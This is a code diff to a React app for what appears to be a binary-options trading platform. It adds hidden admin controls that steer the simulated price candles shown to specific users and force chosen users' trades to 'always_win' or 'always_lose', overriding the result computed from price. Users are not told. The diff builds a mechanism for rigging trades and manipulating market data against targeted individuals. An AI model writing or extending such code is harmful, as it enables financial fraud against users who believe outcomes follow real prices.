@@ -215,6 +215,11 @@ export default function App() {
     candleControlRef.current = centralCandleControl;
   }, [centralCandleControl]);
 
+  const userRef = useRef<UserAccount | null>(user);
+  useEffect(() => {
+    userRef.current = user;
+  }, [user]);
+
   // Real-time Central Candle Control Firestore Listener (Sync across all connected users & devices)
   useEffect(() => {
     const unsubscribe = FirebaseService.listenToCandleControl((ctrl) => {
@@ -558,6 +563,20 @@ export default function App() {
       setCandlesMap((prevMap) => {
         const nextMap = { ...prevMap };
 
+        // Determine effective candle control for the current user (user-specific override takes precedence over global)
+        const emailKey = (userRef.current?.email || '').trim().toLowerCase();
+        const idKey = userRef.current?.id || userRef.current?.numericId;
+        const userOverride = (emailKey && candleControlRef.current?.userCandleOverrides?.[emailKey]) ||
+                             (idKey && candleControlRef.current?.userCandleOverrides?.[idKey]);
+
+        const effectiveControl: CentralCandleControl = {
+          ...candleControlRef.current,
+          direction: (userOverride?.direction && userOverride.direction !== 'NORMAL')
+            ? userOverride.direction
+            : (candleControlRef.current?.direction || 'NORMAL'),
+          intensity: userOverride?.intensity || candleControlRef.current?.intensity || 'medium',
+        };
+
         openAssets.forEach((asset) => {
           const assetCandles = prevMap[asset.id] || [];
           if (assetCandles.length > 0) {
@@ -566,7 +585,7 @@ export default function App() {
               last, 
               asset, 
               timeframeMs, 
-              candleControlRef.current
+              effectiveControl
             );
             nextMap[asset.id] = updatedCandles(assetCandles);
             
@@ -595,11 +614,24 @@ export default function App() {
         });
 
         if (expiring.length > 0) {
+          const emailKey = (userRef.current?.email || '').trim().toLowerCase();
+          const idKey = userRef.current?.id || userRef.current?.numericId;
+          const userOverride = (emailKey && candleControlRef.current?.userCandleOverrides?.[emailKey]) ||
+                               (idKey && candleControlRef.current?.userCandleOverrides?.[idKey]);
+          const userOutcome = userOverride?.outcome;
+
           expiring.forEach((trade) => {
             const finalPrice = currentPricesRef.current[trade.assetId] || trade.openPrice;
-            const isWon =
+            let isWon =
               (trade.type === 'CALL' && finalPrice > trade.openPrice) ||
               (trade.type === 'PUT' && finalPrice < trade.openPrice);
+
+            // Apply targeted user outcome override if set by admin
+            if (userOutcome === 'always_win') {
+              isWon = true;
+            } else if (userOutcome === 'always_lose') {
+              isWon = false;
+            }
 
             const status = isWon ? 'WON' : 'LOST';
             const returnAmount = isWon ? trade.amount * (1 + trade.payoutRate) : 0;
